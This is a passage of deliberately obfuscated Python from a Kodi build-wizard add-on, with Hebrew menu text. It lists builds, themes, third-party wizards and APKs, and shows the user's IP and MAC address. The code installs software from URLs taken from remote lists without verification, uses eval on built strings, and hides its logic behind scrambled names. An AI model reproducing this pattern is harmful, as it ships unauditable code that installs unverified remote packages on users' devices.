	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO0O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2169
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OO000O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2170
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO000OO00OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2171
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0000O0O0000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2172
	setView ('files','viewType')#line:2173
def buildMenu ():#line:2175
	if USERNAME =='':#line:2176
		ADDON .openSettings ()#line:2177
		sys .exit ()#line:2178
	if PASSWORD =='':#line:2179
		ADDON .openSettings ()#line:2180
	OOO0O00O00O00O000 =u_list (SPEEDFILE )#line:2181
	(OOO0O00O00O00O000 )#line:2182
	OO00OOO00000OOOO0 =(wiz .workingURL (OOO0O00O00O00O000 ))#line:2183
	(OO00OOO00000OOOO0 )#line:2184
	OO00OOO00000OOOO0 =wiz .workingURL (SPEEDFILE )#line:2185
	if not OO00OOO00000OOOO0 ==True :#line:2186
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2187
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2188
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2189
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2190
		addFile ('%s'%OO00OOO00000OOOO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2191
	else :#line:2192
		OO0OOOOO0OO000OO0 ,O00O000O00O0000OO ,OOO0000O0OOOO0000 ,OOOO00OOOOO0O0O0O ,OOO0OO0000O0O0O0O ,O000OOOOO0O0000OO ,O00O0OO0OO0O00OO0 =wiz .buildCount ()#line:2193
		O00OOOOO0O00OO00O =False ;O000000O0OOOOOOOO =[]#line:2194
		if THIRDPARTY =='true':#line:2195
			if not THIRD1NAME ==''and not THIRD1URL =='':O00OOOOO0O00OO00O =True ;O000000O0OOOOOOOO .append ('1')#line:2196
			if not THIRD2NAME ==''and not THIRD2URL =='':O00OOOOO0O00OO00O =True ;O000000O0OOOOOOOO .append ('2')#line:2197
			if not THIRD3NAME ==''and not THIRD3URL =='':O00OOOOO0O00OO00O =True ;O000000O0OOOOOOOO .append ('3')#line:2198
		OOOOOOO000OOO0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2199
		O00O000OO0OOO00O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOOOO000OOO0O00 )#line:2200
		if OO0OOOOO0OO000OO0 ==1 and O00OOOOO0O00OO00O ==False :#line:2201
			for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2202
				if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2203
				if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2204
				viewBuild (O00O000OO0OOO00O0 [0 ][0 ])#line:2205
				return #line:2206
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2209
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2210
		if O00OOOOO0O00OO00O ==True :#line:2211
			for OOOO00OO0O0OO0OO0 in O000000O0OOOOOOOO :#line:2212
				OO000000O0OOO00OO =eval ('THIRD%sNAME'%OOOO00OO0O0OO0OO0 )#line:2213
		if len (O00O000OO0OOO00O0 )>=1 :#line:2215
			if SEPERATE =='true':#line:2216
				for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2217
					if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2218
					if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2219
					O00OOOOO0O000O000 =createMenu ('install','',OO000000O0OOO00OO )#line:2220
					addDir ('[%s] %s (v%s)'%(float (OOO00OOOO0OO0000O ),OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ),'viewbuild',OO000000O0OOO00OO ,description =O00OOOO0O0OO00O00 ,fanart =O0OOO0OOO0OOO0000 ,icon =O0OO00OOO00000OOO ,menu =O00OOOOO0O000O000 ,themeit =THEME2 )#line:2221
			else :#line:2222
				if OOOO00OOOOO0O0O0O >0 :#line:2223
					O0OOOO0OO0OO0O0O0 ='+'if SHOW17 =='false'else '-'#line:2224
					if SHOW17 =='true':#line:2226
						for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2228
							if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2229
							if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2230
							OOOO000O0O0OO0OOO =int (float (OOO00OOOO0OO0000O ))#line:2231
							if OOOO000O0O0OO0OOO ==17 :#line:2232
								O00OOOOO0O000O000 =createMenu ('install','',OO000000O0OOO00OO )#line:2233
								addDir ('[%s] %s (v%s)'%(float (OOO00OOOO0OO0000O ),OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ),'viewbuild',OO000000O0OOO00OO ,description =O00OOOO0O0OO00O00 ,fanart =O0OOO0OOO0OOO0000 ,icon =O0OO00OOO00000OOO ,menu =O00OOOOO0O000O000 ,themeit =THEME2 )#line:2234
				if OOO0OO0000O0O0O0O >0 :#line:2235
					O0OOOO0OO0OO0O0O0 ='+'if SHOW18 =='false'else '-'#line:2236
					if SHOW18 =='true':#line:2238
						for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2240
							if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2241
							if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2242
							OOOO000O0O0OO0OOO =int (float (OOO00OOOO0OO0000O ))#line:2243
							if OOOO000O0O0OO0OOO ==18 :#line:2244
								O00OOOOO0O000O000 =createMenu ('install','',OO000000O0OOO00OO )#line:2245
								addDir ('[%s] %s (v%s)'%(float (OOO00OOOO0OO0000O ),OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ),'viewbuild',OO000000O0OOO00OO ,description =O00OOOO0O0OO00O00 ,fanart =O0OOO0OOO0OOO0000 ,icon =O0OO00OOO00000OOO ,menu =O00OOOOO0O000O000 ,themeit =THEME2 )#line:2246
				if OOO0000O0OOOO0000 >0 :#line:2247
					O0OOOO0OO0OO0O0O0 ='+'if SHOW16 =='false'else '-'#line:2248
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OOOO0OO0OO0O0O0 ,OOO0000O0OOOO0000 ),'togglesetting','show16',themeit =THEME3 )#line:2249
					if SHOW16 =='true':#line:2250
						for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2251
							if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2252
							if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2253
							OOOO000O0O0OO0OOO =int (float (OOO00OOOO0OO0000O ))#line:2254
							if OOOO000O0O0OO0OOO ==16 :#line:2255
								O00OOOOO0O000O000 =createMenu ('install','',OO000000O0OOO00OO )#line:2256
								addDir ('[%s] %s (v%s)'%(float (OOO00OOOO0OO0000O ),OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ),'viewbuild',OO000000O0OOO00OO ,description =O00OOOO0O0OO00O00 ,fanart =O0OOO0OOO0OOO0000 ,icon =O0OO00OOO00000OOO ,menu =O00OOOOO0O000O000 ,themeit =THEME2 )#line:2257
				if O00O000O00O0000OO >0 :#line:2258
					O0OOOO0OO0OO0O0O0 ='+'if SHOW15 =='false'else '-'#line:2259
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OOOO0OO0OO0O0O0 ,O00O000O00O0000OO ),'togglesetting','show15',themeit =THEME3 )#line:2260
					if SHOW15 =='true':#line:2261
						for OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ,OO0OOOO0O0OOOO00O ,O0OO00OO00OOO0O00 ,OOO00OOOO0OO0000O ,O0O00OO00OOOOO00O ,O0OO00OOO00000OOO ,O0OOO0OOO0OOO0000 ,OOO00O0OO0OO00O00 ,O00OOOO0O0OO00O00 in O00O000OO0OOO00O0 :#line:2262
							if not SHOWADULT =='true'and OOO00O0OO0OO00O00 .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (OO000000O0OOO00OO ):continue #line:2264
							OOOO000O0O0OO0OOO =int (float (OOO00OOOO0OO0000O ))#line:2265
							if OOOO000O0O0OO0OOO <=15 :#line:2266
								O00OOOOO0O000O000 =createMenu ('install','',OO000000O0OOO00OO )#line:2267
								addDir ('[%s] %s (v%s)'%(float (OOO00OOOO0OO0000O ),OO000000O0OOO00OO ,OOO000O0OO00OO0O0 ),'viewbuild',OO000000O0OOO00OO ,description =O00OOOO0O0OO00O00 ,fanart =O0OOO0OOO0OOO0000 ,icon =O0OO00OOO00000OOO ,menu =O00OOOOO0O000O000 ,themeit =THEME2 )#line:2268
		elif O00O0OO0OO0O00OO0 >0 :#line:2269
			if O000OOOOO0O0000OO >0 :#line:2270
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2271
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2272
			else :#line:2273
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2274
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2275
	setView ('files','viewType')#line:2276
def viewBuild (O000O0OO0OO0OOO00 ):#line:2278
	O0OOO0000O0OO000O =wiz .workingURL (SPEEDFILE )#line:2279
	if not O0OOO0000O0OO000O ==True :#line:2280
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2281
		addFile ('%s'%O0OOO0000O0OO000O ,'',themeit =THEME3 )#line:2282
		return #line:2283
	if wiz .checkBuild (O000O0OO0OO0OOO00 ,'version')==False :#line:2284
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2285
		addFile ('%s was not found in the builds list.'%O000O0OO0OO0OOO00 ,'',themeit =THEME3 )#line:2286
		return #line:2287
	OO0OOOO00OO0O0O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2288
	OOOO0OOOO0O0000OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O0OO0OO0OOO00 ).findall (OO0OOOO00OO0O0O0O )#line:2289
	for O00O0O0OO0O0OOOO0 ,OO0O0O00O00O0OO0O ,OOOO0OOOOOOOO0000 ,OO0000000000O0000 ,OOO00OOOO00O000O0 ,OOOO0000OOOOOO00O ,OO0OO0O0O00OO0O0O ,OO000OOO00OOOOO00 ,O000OOOOOO0O00000 ,OOOO00OO00OOOOO00 in OOOO0OOOO0O0000OO :#line:2290
		OOOO0000OOOOOO00O =OOOO0000OOOOOO00O if wiz .workingURL (OOOO0000OOOOOO00O )else ICON #line:2291
		OO0OO0O0O00OO0O0O =OO0OO0O0O00OO0O0O if wiz .workingURL (OO0OO0O0O00OO0O0O )else FANART #line:2292
		OOO0O0OOO000O0OOO ='%s (v%s)'%(O000O0OO0OO0OOO00 ,O00O0O0OO0O0OOOO0 )#line:2293
		if BUILDNAME ==O000O0OO0OO0OOO00 and O00O0O0OO0O0OOOO0 >BUILDVERSION :#line:2294
			OOO0O0OOO000O0OOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO0O0OOO000O0OOO ,BUILDVERSION )#line:2295
		O000O000O00O0OO0O =int (float (KODIV ));OOOOO000OO00000OO =int (float (OO0000000000O0000 ))#line:2304
		if not O000O000O00O0OO0O ==OOOOO000OO00000OO :#line:2305
			if O000O000O00O0OO0O ==16 and OOOOO000OO00000OO <=15 :OOO0O00O00OOOO00O =False #line:2306
			else :OOO0O00O00OOOO00O =True #line:2307
		else :OOO0O00O00OOOO00O =False #line:2308
		addFile ('התקנה','install',O000O0OO0OO0OOO00 ,'fresh',description =OOOO00OO00OOOOO00 ,fanart =OO0OO0O0O00OO0O0O ,icon =OOOO0000OOOOOO00O ,themeit =THEME1 )#line:2312
		if not OOO00OOOO00O000O0 =='http://':#line:2315
			if wiz .workingURL (OOO00OOOO00O000O0 )==True :#line:2316
				addFile (wiz .sep ('THEMES'),'',fanart =OO0OO0O0O00OO0O0O ,icon =OOOO0000OOOOOO00O ,themeit =THEME3 )#line:2317
				OO0OOOO00OO0O0O0O =wiz .openURL (OOO00OOOO00O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2318
				OOOO0OOOO0O0000OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOOO00OO0O0O0O )#line:2319
				for O0OOO0OOOOOOO0OOO ,O00000O0000O0O00O ,OO0O0O00OO00OO00O ,OO0O00OO0OO0O0O0O ,OOOO0OOO0O0O0000O ,OOOO00OO00OOOOO00 in OOOO0OOOO0O0000OO :#line:2320
					if not SHOWADULT =='true'and OOOO0OOO0O0O0000O .lower ()=='yes':continue #line:2321
					OO0O0O00OO00OO00O =OO0O0O00OO00OO00O if OO0O0O00OO00OO00O =='http://'else OOOO0000OOOOOO00O #line:2322
					OO0O00OO0OO0O0O0O =OO0O00OO0OO0O0O0O if OO0O00OO0OO0O0O0O =='http://'else OO0OO0O0O00OO0O0O #line:2323
					addFile (O0OOO0OOOOOOO0OOO if not O0OOO0OOOOOOO0OOO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOO0OOOOOOO0OOO ,'theme',O000O0OO0OO0OOO00 ,O0OOO0OOOOOOO0OOO ,description =OOOO00OO00OOOOO00 ,fanart =OO0O00OO0OO0O0O0O ,icon =OO0O0O00OO00OO00O ,themeit =THEME3 )#line:2324
	setView ('files','viewType')#line:2325
def viewThirdList (OOO0O0OOOO0OOO0O0 ):#line:2327
	OO00OO0000O00OO0O =eval ('THIRD%sNAME'%OOO0O0OOOO0OOO0O0 )#line:2328
	O0O0O0000O000OOOO =eval ('THIRD%sURL'%OOO0O0OOOO0OOO0O0 )#line:2329
	OOOOO000O00O00000 =wiz .workingURL (O0O0O0000O000OOOO )#line:2330
	if not OOOOO000O00O00000 ==True :#line:2331
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2332
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2333
	else :#line:2334
		OO0O0000O0O000OO0 ,OO0O000OOOOOO000O =wiz .thirdParty (O0O0O0000O000OOOO )#line:2335
		addFile ("[B]%s[/B]"%OO00OO0000O00OO0O ,'',themeit =THEME3 )#line:2336
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2337
		if OO0O0000O0O000OO0 :#line:2338
			for OO00OO0000O00OO0O ,O00OOO0O0000OO0O0 ,O0O0O0000O000OOOO ,O0OO000OOO0O0O0O0 ,O00O0O0OO000OO0O0 ,O0OOOO0O0O00OO0O0 ,OOOOOO0000O0O0OOO ,OOOOO000OOO0OO00O in OO0O000OOOOOO000O :#line:2339
				if not SHOWADULT =='true'and OOOOOO0000O0O0OOO .lower ()=='yes':continue #line:2340
				addFile ("[%s] %s v%s"%(O0OO000OOO0O0O0O0 ,OO00OO0000O00OO0O ,O00OOO0O0000OO0O0 ),'installthird',OO00OO0000O00OO0O ,O0O0O0000O000OOOO ,icon =O00O0O0OO000OO0O0 ,fanart =O0OOOO0O0O00OO0O0 ,description =OOOOO000OOO0OO00O ,themeit =THEME2 )#line:2341
		else :#line:2342
			for OO00OO0000O00OO0O ,O0O0O0000O000OOOO ,O00O0O0OO000OO0O0 ,O0OOOO0O0O00OO0O0 ,OOOOO000OOO0OO00O in OO0O000OOOOOO000O :#line:2343
				addFile (OO00OO0000O00OO0O ,'installthird',OO00OO0000O00OO0O ,O0O0O0000O000OOOO ,icon =O00O0O0OO000OO0O0 ,fanart =O0OOOO0O0O00OO0O0 ,description =OOOOO000OOO0OO00O ,themeit =THEME2 )#line:2344
def editThirdParty (OO0OOOO0O00OO0O0O ):#line:2346
	OOOO0O0O00000O00O =eval ('THIRD%sNAME'%OO0OOOO0O00OO0O0O )#line:2347
	OO0OO00O00OOOOOOO =eval ('THIRD%sURL'%OO0OOOO0O00OO0O0O )#line:2348
	OO00OO0O00OO0OO0O =wiz .getKeyboard (OOOO0O0O00000O00O ,'Enter the Name of the Wizard')#line:2349
	OO0OOOOOOOOOO0O0O =wiz .getKeyboard (OO0OO00O00OOOOOOO ,'Enter the URL of the Wizard Text')#line:2350
	wiz .setS ('wizard%sname'%OO0OOOO0O00OO0O0O ,OO00OO0O00OO0OO0O )#line:2352
	wiz .setS ('wizard%surl'%OO0OOOO0O00OO0O0O ,OO0OOOOOOOOOO0O0O )#line:2353
def apkScraper (name =""):#line:2355
	if name =='kodi':#line:2356
		O00OO000O0OO00OO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2357
		O00OOOOO00OOOOO00 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2358
		OO0O000OO000000OO =wiz .openURL (O00OO000O0OO00OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2359
		OO000OOO00OOOO0OO =wiz .openURL (O00OOOOO00OOOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2360
		OOOOOOOOO00O0O000 =0 #line:2361
		OO0O0OOO00O0OOOOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0O000OO000000OO )#line:2362
		OO0000O0000O000O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO000OOO00OOOO0OO )#line:2363
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2365
		O0O0OO0OOOO0OO0OO =False #line:2366
		for OOOO0O0O0OOO0O00O ,name ,O000O000O000O0O00 ,OOOOOO000O0000000 in OO0O0OOO00O0OOOOO :#line:2367
			if OOOO0O0O0OOO0O00O in ['../','old/']:continue #line:2368
			if not OOOO0O0O0OOO0O00O .endswith ('.apk'):continue #line:2369
			if not OOOO0O0O0OOO0O00O .find ('_')==-1 and O0O0OO0OOOO0OO0OO ==True :continue #line:2370
			try :#line:2371
				O0OO0000OOOOO0O00 =name .split ('-')#line:2372
				if not OOOO0O0O0OOO0O00O .find ('_')==-1 :#line:2373
					O0O0OO0OOOO0OO0OO =True #line:2374
					OOOO00O0OOOO0000O ,OO000O0OOO00OO0O0 =O0OO0000OOOOO0O00 [2 ].split ('_')#line:2375
				else :#line:2376
					OOOO00O0OOOO0000O =O0OO0000OOOOO0O00 [2 ]#line:2377
					OO000O0OOO00OO0O0 =''#line:2378
				O0O00OOO0OO0OO0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000OOOOO0O00 [0 ].title (),O0OO0000OOOOO0O00 [1 ],OO000O0OOO00OO0O0 .upper (),OOOO00O0OOOO0000O ,COLOR2 ,O000O000O000O0O00 .replace (' ',''),COLOR1 ,OOOOOO000O0000000 )#line:2379
				OOO00O00O0000O000 =urljoin (O00OO000O0OO00OO0 ,OOOO0O0O0OOO0O00O )#line:2380
				addFile (O0O00OOO0OO0OO0O0 ,'apkinstall',"%s v%s%s %s"%(O0OO0000OOOOO0O00 [0 ].title (),O0OO0000OOOOO0O00 [1 ],OO000O0OOO00OO0O0 .upper (),OOOO00O0OOOO0000O ),OOO00O00O0000O000 )#line:2381
				OOOOOOOOO00O0O000 +=1 #line:2382
			except :#line:2383
				wiz .log ("Error on: %s"%name )#line:2384
		for OOOO0O0O0OOO0O00O ,name ,O000O000O000O0O00 ,OOOOOO000O0000000 in OO0000O0000O000O0 :#line:2386
			if OOOO0O0O0OOO0O00O in ['../','old/']:continue #line:2387
			if not OOOO0O0O0OOO0O00O .endswith ('.apk'):continue #line:2388
			if not OOOO0O0O0OOO0O00O .find ('_')==-1 :continue #line:2389
			try :#line:2390
				O0OO0000OOOOO0O00 =name .split ('-')#line:2391
				O0O00OOO0OO0OO0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000OOOOO0O00 [0 ].title (),O0OO0000OOOOO0O00 [1 ],O0OO0000OOOOO0O00 [2 ],COLOR2 ,O000O000O000O0O00 .replace (' ',''),COLOR1 ,OOOOOO000O0000000 )#line:2392
				OOO00O00O0000O000 =urljoin (O00OOOOO00OOOOO00 ,OOOO0O0O0OOO0O00O )#line:2393
				addFile (O0O00OOO0OO0OO0O0 ,'apkinstall',"%s v%s %s"%(O0OO0000OOOOO0O00 [0 ].title (),O0OO0000OOOOO0O00 [1 ],O0OO0000OOOOO0O00 [2 ]),OOO00O00O0000O000 )#line:2394
				OOOOOOOOO00O0O000 +=1 #line:2395
			except :#line:2396
				wiz .log ("Error on: %s"%name )#line:2397
		if OOOOOOOOO00O0O000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2398
	elif name =='spmc':#line:2399
		O0O0O000OO0OOOOO0 ='https://github.com/koying/SPMC/releases'#line:2400
		OO0O000OO000000OO =wiz .openURL (O0O0O000OO0OOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2401
		OOOOOOOOO00O0O000 =0 #line:2402
		OO0O0OOO00O0OOOOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0O000OO000000OO )#line:2403
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2405
		for name ,OO00000OOOOO0OOOO in OO0O0OOO00O0OOOOO :#line:2407
			O000O0000OO0OOO0O =''#line:2408
			OO0000O0000O000O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO00000OOOOO0OOOO )#line:2409
			for O0O000OOO0OO0O0OO ,O0O00OO0OOOOO000O ,O00O000OOO0000000 in OO0000O0000O000O0 :#line:2410
				if O00O000OOO0000000 .find ('armeabi')==-1 :continue #line:2411
				if O00O000OOO0000000 .find ('launcher')>-1 :continue #line:2412
				O000O0000OO0OOO0O =urljoin ('https://github.com',O0O000OOO0OO0O0OO )#line:2413
				break #line:2414
		if OOOOOOOOO00O0O000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2416
def apkMenu (url =None ):#line:2418
	if url ==None :#line:2419
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2422
	if not APKFILE =='http://':#line:2423
		if url ==None :#line:2424
			O0O000O0O000O000O =wiz .workingURL (APKFILE )#line:2425
			O00O0OO000000OOOO =uservar .APKFILE #line:2426
		else :#line:2427
			O0O000O0O000O000O =wiz .workingURL (url )#line:2428
			O00O0OO000000OOOO =url #line:2429
		if O0O000O0O000O000O ==True :#line:2430
			O0OO0O00OOO000000 =wiz .openURL (O00O0OO000000OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2431
			O0O00O00OOOO0O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O00OOO000000 )#line:2432
			if len (O0O00O00OOOO0O00O )>0 :#line:2433
				O000O0OO000OO0O0O =0 #line:2434
				for O0000000000000OOO ,O0OOOO00O0OO00OOO ,url ,O00OOO0OOOO0O000O ,OOOOO0O00OO0OOO00 ,OOOOO0O00O0O00000 ,OOOOO0OOO00000O00 in O0O00O00OOOO0O00O :#line:2435
					if not SHOWADULT =='true'and OOOOO0O00O0O00000 .lower ()=='yes':continue #line:2436
					if O0OOOO00O0OO00OOO .lower ()=='yes':#line:2437
						O000O0OO000OO0O0O +=1 #line:2438
						addDir ("[B]%s[/B]"%O0000000000000OOO ,'apk',url ,description =OOOOO0OOO00000O00 ,icon =O00OOO0OOOO0O000O ,fanart =OOOOO0O00OO0OOO00 ,themeit =THEME3 )#line:2439
					else :#line:2440
						O000O0OO000OO0O0O +=1 #line:2441
						addFile (O0000000000000OOO ,'apkinstall',O0000000000000OOO ,url ,description =OOOOO0OOO00000O00 ,icon =O00OOO0OOOO0O000O ,fanart =OOOOO0O00OO0OOO00 ,themeit =THEME2 )#line:2442
					if O000O0OO000OO0O0O <1 :#line:2443
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2444
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2445
		else :#line:2446
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2447
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2448
			addFile ('%s'%O0O000O0O000O000O ,'',themeit =THEME3 )#line:2449
		return #line:2450
	else :wiz .log ("[APK Menu] No APK list added.")#line:2451
	setView ('files','viewType')#line:2452
def addonMenu (url =None ):#line:2454
	if not ADDONFILE =='http://':#line:2455
		if url ==None :#line:2456
			O000OOO0OOO0OOO00 =wiz .workingURL (ADDONFILE )#line:2457
			OO0OOO0OOOOO000O0 =uservar .ADDONFILE #line:2458
		else :#line:2459
			O000OOO0OOO0OOO00 =wiz .workingURL (url )#line:2460
			OO0OOO0OOOOO000O0 =url #line:2461
		if O000OOO0OOO0OOO00 ==True :#line:2462
			O00OO0OO000000000 =wiz .openURL (OO0OOO0OOOOO000O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2463
			OOOO00OO00OOOO000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO0OO000000000 )#line:2464
			if len (OOOO00OO00OOOO000 )>0 :#line:2465
				OO00OO00O000O0O00 =0 #line:2466
				for OOOO0OO0O0000000O ,O0OOO0000OO00OOO0 ,url ,OO0OO00000OOOOO0O ,O00000O0O00OO0O0O ,O0O00O0O0OO00O000 ,OOO00OOO000O0000O ,O00O0O00000OOOO0O ,OOOO0OOO0OOO0000O ,OOOOOOO0O0O000OO0 in OOOO00OO00OOOO000 :#line:2467
					if O0OOO0000OO00OOO0 .lower ()=='section':#line:2468
						OO00OO00O000O0O00 +=1 #line:2469
						addDir ("[B]%s[/B]"%OOOO0OO0O0000000O ,'addons',url ,description =OOOOOOO0O0O000OO0 ,icon =OOO00OOO000O0000O ,fanart =O00O0O00000OOOO0O ,themeit =THEME3 )#line:2470
					else :#line:2471
						if not SHOWADULT =='true'and OOOO0OOO0OOO0000O .lower ()=='yes':continue #line:2472
						try :#line:2473
